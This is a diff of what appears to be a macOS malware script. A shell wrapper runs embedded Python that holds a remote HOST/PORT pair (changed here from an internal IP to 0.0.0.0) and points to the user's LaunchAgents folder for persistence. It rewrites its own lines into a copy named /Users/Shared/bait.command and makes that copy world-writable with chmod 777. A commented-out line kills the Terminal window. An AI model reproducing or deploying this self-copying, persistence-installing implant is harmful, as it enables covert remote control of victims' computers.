@@ -6,14 +6,14 @@ FILE_NAME=$0;
 
 sh -c '
 #killall Terminal;
-FILE_NAME=$FILE_NAME1
+
 
 python3 -c "
-HOST,PORT=\"10.1.36.43\",\"9742\"
+HOST,PORT=\"0.0.0.0\",\"0\"
 from subprocess import run, Popen, PIPE
 from time import sleep
 import os
-script_path = \"$1\"
+script_path = os.path.abspath(\"$1\")
 shared_path = os.path.abspath(\"$HOME/../Shared\")
 la_path = \"$HOME/Library/LaunchAgents\"
 
@@ -21,9 +21,9 @@ plist_data = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist P
 
 with open(script_path,\"r\") as e:
     filedata = e.readlines()
-    filedata[16] = f\"script_path=\\\\\\\"{script_path}\\\\\\\"\\n\"
-    filedata[17] = f\"shared_path=\\\\\\\"{shared_path}\\\\\\\"\\n\"
-    filedata[18] = f\"la_path=\\\\\\\"{la_path}\\\\\\\"\\n\"
+    filedata[15] = f\"script_path=\\\\\\\"{script_path}\\\\\\\"\\n\"
+    filedata[16] = f\"shared_path=\\\\\\\"{shared_path}\\\\\\\"\\n\"
+    filedata[17] = f\"la_path=\\\\\\\"{la_path}\\\\\\\"\\n\"
     with open(shared_path+\"/bait.command\",\"w\") as b:
         b.writelines(filedata)
 Popen([\"chmod\",\"777\",\"/Users/Shared/bait.command\"])
